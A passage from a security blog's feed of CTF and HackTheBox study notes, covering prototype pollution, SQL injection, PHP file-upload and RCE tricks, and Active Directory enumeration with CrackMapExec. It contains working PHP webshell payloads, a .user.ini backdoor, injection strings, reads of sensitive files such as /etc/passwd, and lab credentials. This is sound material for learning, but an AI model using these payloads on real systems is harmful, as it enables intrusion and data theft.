2, b: 1&#125;  // 无污染，结果正常console.log(newUser.__proto__)  // &#123;constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …&#125;</code></pre><p>但是好在后端服务器是JavaScript，我们通过post发送过去的 json是字符串，JavaScript需要通过JSON.parse()函数才能把 json字符串转成对象，如之前所说，json解析时<code>__proto__</code>能被当成真正的key</p><h1 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h1><p>如果遇到过滤的话：</p><p>字符串 stringObject 的 replace() 方法执行的是查找并替换的操作。它将在 stringObject 中查找与 regexp 相匹配的子字符串，然后用 <em>replacement</em> 来替换这些子串。如果 regexp 具有全局标志 g，那么 replace() 方法将替换所有匹配的子串。否则，它只替换第一个匹配子串。</p><p><em>replacement</em> 可以是字符串，也可以是函数。如果它是字符串，那么每个匹配都将由字符串替换。但是 replacement 中的 <code>$</code> 字符具有特定的含义。如下表所示，它说明从模式匹配得到的字符串将用于替换。</p><p><img src="https://drun1baby.top/2022/12/29/JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/replace.png" alt="img"></p><pre><code>&#39;123&#39;.replace(&quot;2&quot;,&#39;$`&#39;);&quot;113&quot;&#39;123&#39;.replace(&quot;2&quot;,&quot;$&#39;&quot;);&quot;133&quot;</code></pre><p>这里先把匹配到的字符串替换为$`,然后由于$特殊含义，此时 $`又被替换为原位置的左侧文本，另一个同理</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原型链污染&quot;&gt;&lt;a href=&quot;#原型链污染&quot; class=&quot;headerlink&quot; title=&quot;原型链污染&quot;&gt;&lt;/a&gt;原型链污染&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/Java</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://taninluv.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CTF_Marks</title>
    <link href="https://taninluv.github.io/2023/11/01/CTF-Marks/"/>
    <id>https://taninluv.github.io/2023/11/01/CTF-Marks/</id>
    <published>2023-11-01T12:16:11.000Z</published>
    <updated>2023-11-15T12:45:07.576Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p><a href="https://blog.csdn.net/l2872253606/article/details/123362430">【精选】攻防世界之supersqli_攻防世界supersqli_金 帛的博客-CSDN博客</a></p><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><p>show databases</p><p>show tables</p><p>当纯数字字符串是表名的时候需要加反引号:</p><p>show columns from `1919810931114514`</p><p>反引号表示内容为表明</p><h2 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h2><p><a href="https://blog.csdn.net/qq_43427482/article/details/109898934">【MySQL】MySQL 之 handler 的详细使用及说明_mysql handler-CSDN博客</a></p><h5 id="1、打开句柄"><a href="#1、打开句柄" class="headerlink" title="1、打开句柄"></a>1、打开句柄</h5><pre><code class="mysql">handler handler_table open;#这里可以使用别名</code></pre><h5 id="2、查看数据"><a href="#2、查看数据" class="headerlink" title="2、查看数据"></a>2、查看数据</h5><pre><code class="mysql">handler handler_table read first;handler handler_table read next;</code></pre><p>payload:</p><pre><code>1&#39;;use supersqli;handler `1919810931114514` open as p;handler p read first;</code></pre><h2 id="预编译绕过法"><a href="#预编译绕过法" class="headerlink" title="预编译绕过法"></a>预编译绕过法</h2><p><a href="https://blog.csdn.net/bb15070047748/article/details/107266400">什么是MySQL的预编译？_mysql 预编译-CSDN博客</a></p><pre><code>-1&#39;;set @sql = CONCAT(&#39;sele&#39;,&#39;ct flag from `1919810931114514`;&#39;);prepare stmt from @sql;EXECUTE stmt;#</code></pre><p>感觉像是set设置变量值然后在语句中替换，使用concat绕过关键字过滤</p><h2 id="修改原查询法"><a href="#修改原查询法" class="headerlink" title="修改原查询法"></a>修改原查询法</h2><p>如果没有过滤alter，把默认展示的字段名字修改，把想看的字段名字、表明等修改为默认展示的名字</p><p>将放着flag的表1919810931114514名字改成words</p><p>alter table <code>1919810931114514</code> rename to words</p><p>表里头字段名flag改成id</p><p>alter table words change flag id varchar(100)</p><ul><li><p><code>ALTER TABLE words</code> 表示您要修改的表是名为 <code>words</code> 的表。</p></li><li><pre><code>CHANGE flag id varchar(100)</code></pre><p> 是实际的修改部分。它的含义是：</p><ul><li><code>CHANGE</code> 表示您要更改一个列的属性。</li><li><code>flag</code> 是要更改的列的当前名称。</li><li><code>id</code> 是要将该列更改为的新名称。</li><li><code>varchar(100)</code> 是新的数据类型，将该列更改为 VARCHAR 类型，最大长度为 100 个字符。</li></ul></li></ul><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><ul><li>strstr函数不区分大小写，所以我们可以改一下大小写来绕过strstr函数</li><li>过滤了union select，我们用union all select 就可以绕过</li></ul><h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><p><a href="https://blog.csdn.net/m0_63525319/article/details/127982141">sql中的无关子查询与相关子查询和集合查询详细举例说明_无关子查询和相关子查询_ctf^_^的博客-CSDN博客</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311030020659.png" alt="image-20231103001841549"></p><p>相当于临时新建了一个a表，username字段放入admin，password字段放入123，用来绕过其后的验证：</p><pre><code>query (&quot;select username,password from &quot;.$this-&gt;table.&quot; where username=&#39;&quot;.$this-&gt;username.&quot;&#39; and password=&#39;&quot;.$this-&gt;password.&quot;&#39;&quot;);</code></pre><h1 id="FileUpload"><a href="#FileUpload" class="headerlink" title="FileUpload"></a>FileUpload</h1><p><a href="https://blog.csdn.net/yuanxu8877/article/details/128071631">【精选】攻防世界easyupload （web新手）_sean7777777的博客-CSDN博客</a></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&lt;?= eval($_POST[1]);?&gt;&lt;script language=&quot;php&quot;&gt;eval($_POST[1]);&lt;/script&gt;php://filter/convert.iconv.UTF-7.UCS-4*/resource=xxx.php</code></pre><h2 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h2><ul><li>&#x2F;etc&#x2F;passwd</li><li><code>/proc/self/cmdline</code>，用于获取当前启动进程的完整命令。</li><li>&#x2F;proc&#x2F;self&#x2F;maps获取堆栈分布</li><li>&#x2F;proc&#x2F;self&#x2F;mem得到进程的内存内容</li></ul><h2 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.<a href="https://so.csdn.net/so/search?q=ini%E6%96%87%E4%BB%B6&spm=1001.2101.3001.7020">ini文件</a></h2><p>具体参考<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">.user.ini文件构成的PHP后门 - phith0n (wooyun.js.org)</a></p><p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p><p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p><p>在哪些情况下可以用到这个姿势？ 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。</p><p>.user.ini</p><pre><code>auto_prepend_file=a.jpg</code></pre><p>a.jpg</p><pre><code>GIF89a&lt;?php eval($_P0ST[&#39;a&#39;]); ?&gt;</code></pre><h2 id="后缀"><a href="#后缀" class="headerlink" title="后缀"></a>后缀</h2><p>利用了一个Linux的目录结构特性 , 请看下面代码：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190907181102.png" alt="20190907181102.png"></p><p>这里访问 <code>./1.php/2.php/..</code> 代表访问 <code>2.php</code>的父目录 , 也就是访问 <code>1.php</code> 。</p><p>因此这里构造数据包时 , 可以构造如下POST数据</p><pre><code>con=&lt;?php @eval($_POST[cmd]);?&gt;&amp;file=test.php/1.php/..</code></pre><h1 id="php相关"><a href="#php相关" class="headerlink" title="php相关"></a>php相关</h1><h2 id="RCE-变量动态调用函数"><a href="#RCE-变量动态调用函数" class="headerlink" title="RCE-变量动态调用函数"></a>RCE-变量动态调用函数</h2><p>[buuctf-<a href="https://blog.csdn.net/xhy18634297976/article/details/123148026">CISCN 2019 初赛]Love Math（小宇特详解）_小宇特详解的博客-CSDN博客</a></p><p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘cat&#x2F;flag’);</p><pre><code>$a=&#39;system&#39;;$a(&#39;cat/flag&#39;);payload:?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag</code></pre><h3 id="hex2bin-函数"><a href="#hex2bin-函数" class="headerlink" title="hex2bin() 函数"></a>hex2bin() 函数</h3><p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p><p><a href="https://coding.tools/cn/ascii-to-hex">ASCII字符串到16进制在线转换工具 - Coding.Tools</a></p><h3 id="base-convert-函数"><a href="#base-convert-函数" class="headerlink" title="base_convert()函数"></a>base_convert()函数</h3><p>base_convert()函数能够在任意进制之间转换数字</p><p>hex2bin可以看做是36进制，用base_convert来转换将在10进制的数字转换为16进制就可以出现hex2bin</p><p>hex2bin&#x3D;base_convert(37907361743,10,36)</p><h3 id="dechex-函数"><a href="#dechex-函数" class="headerlink" title="dechex()函数"></a>dechex()函数</h3><p>dechex()函数将10进制数转换为16进制的数</p><p><a href="https://www.sojson.com/hexconvert/16to10.html">十六进制转十进制| 16进制转10进制 | 在线进制转换工具 (sojson.com)</a></p><h2 id="RCE-preg-replace"><a href="#RCE-preg-replace" class="headerlink" title="RCE-preg_replace"></a>RCE-preg_replace</h2><p><a href="https://blog.csdn.net/giaogiao123/article/details/121217533">php代码审计之preg_replace函数_php preg_replace-CSDN博客</a></p><p>1.&#x2F;e修饰符必不可少<br>2.你必须让 subject 中有 pattern 的匹配。<br>3.可能跟php版本有关系,受用条件也只限于5.5到5.6的php版本<br>4.满足可变变量的条件</p><h2 id="反序列化-POP-chains"><a href="#反序列化-POP-chains" class="headerlink" title="反序列化 POP chains"></a>反序列化 POP chains</h2><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231110111419036.png" alt="image-20231110111419036"></p><p><a href="https://blog.csdn.net/cosmoslin/article/details/120297881">【精选】php反序列化—POP 链的构造利用_反序列化pop链-CSDN博客</a></p><p><a href="https://www.php.net/manual/zh/function.popen.php">PHP: popen - Manual</a></p><pre><code>popen(string $command, string $mode): resource|false</code></pre><p>返回一个和 <a href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a> 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用 <a href="https://www.php.net/manual/zh/function.pclose.php">pclose()</a> 来关闭。此指针可以用于 <a href="https://www.php.net/manual/zh/function.fgets.php">fgets()</a>，<a href="https://www.php.net/manual/zh/function.fgetss.php">fgetss()</a> 和 <a href="https://www.php.net/manual/zh/function.fwrite.php">fwrite()</a>。 当模式为 ‘r’，返回的文件指针等于命令的 STDOUT，当模式为 ‘w’，返回的文件指针等于命令的 STDIN。</p><pre><code>&lt;?php$handle = popen(&quot;/bin/ls&quot;, &quot;r&quot;);?&gt;</code></pre><p><a href="https://www.cnblogs.com/gaohj/p/3267692.html">PHP执行系统外部命令函数:exec()、passthru()、system()、shell_exec() - gaohj - 博客园 (cnblogs.com)</a></p><pre><code>function passthru(string $command,int[optional] $return_value)</code></pre><p>passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。</p><pre><code>&lt;?php        passthru(&quot;ls&quot;);?&gt;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQL&quot;&gt;&lt;a href=&quot;#SQL&quot; class=&quot;headerlink&quot; title=&quot;SQL&quot;&gt;&lt;/a&gt;SQL&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/l2872253606/article/details/1233624</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://taninluv.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Windows_Privilege_Escalation</title>
    <link href="https://taninluv.github.io/2023/10/24/Windows-Privilege-Escalation/"/>
    <id>https://taninluv.github.io/2023/10/24/Windows-Privilege-Escalation/</id>
    <published>2023-10-24T12:47:13.000Z</published>
    <updated>2023-10-24T12:58:40.421Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息枚举"><a href="#信息枚举" class="headerlink" title="信息枚举"></a>信息枚举</h1><h2 id="查看arp缓存"><a href="#查看arp缓存" class="headerlink" title="查看arp缓存"></a>查看arp缓存</h2><pre><code>arp -a</code></pre><h2 id="查看路由表"><a href="#查看路由表" class="headerlink" title="查看路由表"></a>查看路由表</h2><pre><code>route print</code></pre><h2 id="powershell-查看Windows-Defender-状态"><a href="#powershell-查看Windows-Defender-状态" class="headerlink" title="powershell:查看Windows Defender 状态"></a>powershell:查看Windows Defender 状态</h2><pre><code>Get-MpComputerStatus</code></pre><h2 id="ps-列出应用锁程序规则"><a href="#ps-列出应用锁程序规则" class="headerlink" title="ps:列出应用锁程序规则"></a>ps:列出应用锁程序规则</h2><pre><code class="powershell-session">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code></pre><h2 id="测试AppLocker策略"><a href="#测试AppLocker策略" class="headerlink" title="测试AppLocker策略"></a>测试AppLocker策略</h2><pre><code class="powershell-session">PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User EveryoneFilePath                    PolicyDecision MatchingRule--------                    -------------- ------------C:\Windows\System32\cmd.exe         Denied c:\windows\system32\cmd.exe</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;信息枚举&quot;&gt;&lt;a href=&quot;#信息枚举&quot; class=&quot;headerlink&quot; title=&quot;信息枚举&quot;&gt;&lt;/a&gt;信息枚举&lt;/h1&gt;&lt;h2 id=&quot;查看arp缓存&quot;&gt;&lt;a href=&quot;#查看arp缓存&quot; class=&quot;headerlink&quot; title=&quot;查看a</summary>
      
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
    <category term="Windows" scheme="https://taninluv.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>sqli-lab_pass</title>
    <link href="https://taninluv.github.io/2023/10/20/sqli-lab-pass/"/>
    <id>https://taninluv.github.io/2023/10/20/sqli-lab-pass/</id>
    <published>2023-10-20T08:18:51.000Z</published>
    <updated>2023-11-07T09:09:59.534Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://drun1baby.top/2022/03/22/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1-SQL-%E6%B3%A8%E5%85%A5/">从0到1完全掌握 SQL 注入 | Drunkbaby’s Blog (drun1baby.top)</a></p><h1 id="information-schema"><a href="#information-schema" class="headerlink" title="information schema"></a>information schema</h1><p><a href="https://www.pianshen.com/article/3739146098/">mysql中information_schema说明 - 程序员大本营 (pianshen.com)</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202310211803755.png" alt="image-20231020172620307"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202310211803757.png" alt="image-20231020172716074"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202310211803758.png" alt="image-20231020172740361"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202310211803760.png" alt="image-20231020172751913"></p><p><a href="https://blog.csdn.net/cplvfx/article/details/108292814">information_schema.columns字段说明，获取数据库表所有列信息-CSDN博客</a></p><h1 id="mysql中的连接函数"><a href="#mysql中的连接函数" class="headerlink" title="mysql中的连接函数"></a>mysql中的连接函数</h1><p><a href="https://blog.csdn.net/qq_34292479/article/details/86500185">详解MySQL中CONCAT()函数的用法（链接字符串）_mysql concat-CSDN博客</a></p><p><a href="https://blog.csdn.net/liu_feng_zi_/article/details/106863688">SQL学习笔记——limit用法（limit使用一个参数，limit使用两个参数）_limit参数-CSDN博客</a></p><h1 id="SUBSTR-、Ascii"><a href="#SUBSTR-、Ascii" class="headerlink" title="SUBSTR()、Ascii()"></a>SUBSTR()、Ascii()</h1><p><a href="https://zhuanlan.zhihu.com/p/110142732">MySQL|SUBSTR() 函数用法 - 知乎 (zhihu.com)</a></p><p><a href="https://www.yiibai.com/sqlserver/sql-server-ascii-function.html">SQL Server Ascii()函数 - SQL Server教程 (yiibai.com)</a></p><h1 id="extractvalue-、updatexml-、floor-报错注入"><a href="#extractvalue-、updatexml-、floor-报错注入" class="headerlink" title="extractvalue()、updatexml()、floor()报错注入"></a>extractvalue()、updatexml()、floor()报错注入</h1><p><a href="https://blog.csdn.net/weixin_46145442/article/details/110254238">sql注入中报错注入函数extractvalue和updatexml函数的原理及使用-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_46634468/article/details/120692475">【精选】SQL报错型注入原理-详细讲解 extractvalue()、updatexml()、floor() 的报错原因-CSDN博客</a></p><p>如果<code>extractvalue()</code>爆出的字段数不够，在条件中加入not来去除已经查询到的数据，然后显示未查询到的</p><p>such as：</p><pre><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and column_name not in (&#39;user_id&#39;,&#39;first_name&#39;,&#39;last_name&#39;,&#39;user&#39;,&#39;avatar&#39;,&#39;last_login&#39;,&#39;failed_login&#39;)))) --+</code></pre><p><code>extractvalue()</code>第二个参数似乎只能注入<code>concat()</code>（-笔者目前所知），但是<code>concat()</code>的参数可以嵌套<code>group_concat()</code>:</p><pre><code>127.0.0.1/Less-5/?id=1&#39;%20 union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</code></pre><p>也可已使用用<code>substring()</code>函数截取</p><pre><code>select (extractvalue(1,concat(0x7e,substring(hex((select database())),1,32))));</code></pre><p>经过测试，<code>updatexml()</code>也是可以和上面这样的嵌套</p><pre><code>http://127.0.0.1/Less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20group_concat(username)%20from%20users%20where%20username%20not%20in%20(%22Angelina%22,%22Dummy%22,%22secure,stup%22)),0x7e),1)%20--+</code></pre><p>同样的情况下，应该可以使用<code>floor()</code>(但是根据上方博客的测试内容，rand()产生的伪随机数列011011001，需要运行到第三次产生异常导致报错，所以笔者预估需要数据库中至少三个数据才能使用floor()报错注入):</p><pre><code>“select * from users where id=‘1’ and ( select 1 from ( select count(),concat( ( select schema_name from information_schema.schemata limit 0,1 ), floor( rand( 0 )2 ) ) x from information_schema.schemata group by x ) b ) --+ ’ LIMIT 0,1”</code></pre><h1 id="left-、right"><a href="#left-、right" class="headerlink" title="left()、right()"></a>left()、right()</h1><p><a href="https://blog.csdn.net/m0_69860228/article/details/124897306">SQL中常用的字符串LEFT函数和RIGHT函数详解_数据库left_Java架构狮的博客-CSDN博客</a></p><h1 id="limit和offset"><a href="#limit和offset" class="headerlink" title="limit和offset"></a>limit和offset</h1><p><a href="https://zhuanlan.zhihu.com/p/116007156">MYSQL|limit和offset用法 - 知乎 (zhihu.com)</a></p><h1 id="outfile"><a href="#outfile" class="headerlink" title="outfile"></a>outfile</h1><p><a href="https://blog.csdn.net/weixin_44377973/article/details/109265546">MySQL讲义第 36 讲——select 查询之 INTO OUTFILE参数_select into outfile-CSDN博客</a></p><h1 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h1><p><a href="https://blog.csdn.net/weixin_43096078/article/details/108215076">SQL注入中，注释#、 –+、 –%20、 %23到底是什么意思？sqli-labs-master-CSDN博客</a></p><p>在get请求中使用<code>--+</code>而在post请求中使用<code>#</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/03/22/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1-SQL-%E6%B3%A8%E5%85%A5/&quot;&gt;从0到1完全掌握 SQL </summary>
      
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
    <category term="sqli-lab" scheme="https://taninluv.github.io/tags/sqli-lab/"/>
    
  </entry>
  
  <entry>
    <title>AD-3</title>
    <link href="https://taninluv.github.io/2023/10/02/AD-3/"/>
    <id>https://taninluv.github.io/2023/10/02/AD-3/</id>
    <published>2023-10-02T07:39:28.000Z</published>
    <updated>2023-10-07T09:00:45.041Z</updated>
    
    <content type="html"><![CDATA[<ul><li>Deeper Down the Rabbit Hole<ul><li>认证枚举</li></ul></li><li>Cooking with Fire</li></ul><span id="more"></span><h1 id="Credentialed-Enumeration-from-Linux"><a href="#Credentialed-Enumeration-from-Linux" class="headerlink" title="Credentialed Enumeration - from Linux"></a>Credentialed Enumeration - from Linux</h1><h4 id="CME-Domain-User-Enumeration"><a href="#CME-Domain-User-Enumeration" class="headerlink" title="CME - Domain User Enumeration"></a>CME - Domain User Enumeration</h4><p>我们首先将CME指向域控制器，并使用第二个用户的凭据来检索所有域用户的列表。请注意，当它向我们提供用户信息时，它包括诸如badPwdCount属性之类的数据点。这在执行有针对性的密码喷洒等操作时很有帮助。我们可以构建一个目标用户列表，过滤掉badPwdCount属性高于0的任何用户，以格外小心，不要锁定任何帐户。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --usersSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 3 baddpwdtime: 2022-02-24 18:10:01.903395&lt;SNIP&gt;</code></pre><p>我们还可以获得域组的完整列表。我们应该将所有输出保存到文件中，以便以后再次轻松访问，以便进行报告或与其他工具一起使用。</p><h4 id="CME-Domain-Group-Enumeration"><a href="#CME-Domain-Group-Enumeration" class="headerlink" title="CME - Domain Group Enumeration"></a>CME - Domain Group Enumeration</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groupsSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)SMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4SMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2SMB         172.16.5.5      445    ACADEMY-EA-DC01  Print Operators                          membercount: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1SMB         172.16.5.5      445    ACADEMY-EA-DC01  Replicator                               membercount: 0&lt;SNIP&gt;SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Admins                            membercount: 19SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Users                             membercount: 0&lt;SNIP&gt;SMB         172.16.5.5      445    ACADEMY-EA-DC01  Contractors                              membercount: 138SMB         172.16.5.5      445    ACADEMY-EA-DC01  Accounting                               membercount: 15SMB         172.16.5.5      445    ACADEMY-EA-DC01  Engineering                              membercount: 19SMB         172.16.5.5      445    ACADEMY-EA-DC01  Executives                               membercount: 10SMB         172.16.5.5      445    ACADEMY-EA-DC01  Human Resources                          membercount: 36&lt;SNIP&gt;</code></pre><p>上面的代码段列出了域中的组以及每个组中的用户数。输出还显示域控制器上的内置组，例如Backup Operators。我们可以开始记下感兴趣的群体。请注意关键组，如管理员、域管理员、行政人员，以及可能包含特权IT管理员的任何组等。这些组可能包含具有提升权限的用户，值得在我们的评估中作为目标。</p><h4 id="CME-Logged-On-Users"><a href="#CME-Logged-On-Users" class="headerlink" title="CME - Logged On Users"></a>CME - Logged On Users</h4><p>我们也可以使用CME来瞄准其他主机。让我们检查一下似乎是文件服务器的内容，看看当前登录了哪些用户。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-usersSMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon usersSMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01&lt;SNIP&gt;</code></pre><p>我们看到许多用户登录到这个服务器，这非常有趣。我们还可以看到，我们的用户forend是本地管理员，因为（Pwn3d！）出现在工具成功验证到目标主机之后。像这样的主机可以被管理用户用作跳转主机或类似的主机。我们可以看到用户wley已经登录，我们之前将其标识为域管理员。如果我们可以从内存中窃取或模拟该用户的凭据，这可能是一场轻松的胜利。 正如我们稍后将看到的，BloodHound（以及PowerView等其他工具）可以用于查找用户会话。BloodHound功能特别强大，因为我们可以使用它以多种方式以图形方式快速查看域用户会话。无论如何，像CME这样的工具非常适合更有针对性的枚举和用户搜索。</p><h4 id="CME-Share-Searching"><a href="#CME-Share-Searching" class="headerlink" title="CME Share Searching"></a>CME Share Searching</h4><p>我们看到有几个共享可供我们使用READ访问。Department Shares<code>, </code>User Shares和ZZZ_archive共享值得进一步挖掘，因为它们可能包含密码或PII等敏感数据。接下来，我们可以深入挖掘共享，并在每个目录中搜寻文件。spider_plus模块将挖掘主机上的每个可读共享，并列出所有可读文件。让我们试一试。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share &#39;Department Shares&#39;SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        DIR: [&#39;print$&#39;]SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        EXT: [&#39;ico&#39;, &#39;lnk&#39;]SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]       SIZE: 51200SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus</code></pre><p>在上面的命令中，我们对Department Shares运行了spider。完成后，CME将结果写入位于&#x2F;tmp&#x2F;CME_spider_plus&#x2F;<ip-of-host>的JSON文件。下面我们可以看到JSON输出的一部分。我们可以四处寻找有趣的文件，例如web.config文件或可能包含密码的脚本。如果我们想进一步挖掘，我们可以提取这些文件来查看其中包含的内容，也许可以找到一些硬编码的凭据或其他敏感信息。</p><p>这只是对其能力的一个微小的观察；值得对实验室目标进行更多的实验。在本模块的剩余部分中，我们将以各种方式利用CME。让我们继续看SMBMap。</p><h2 id="SMBMap"><a href="#SMBMap" class="headerlink" 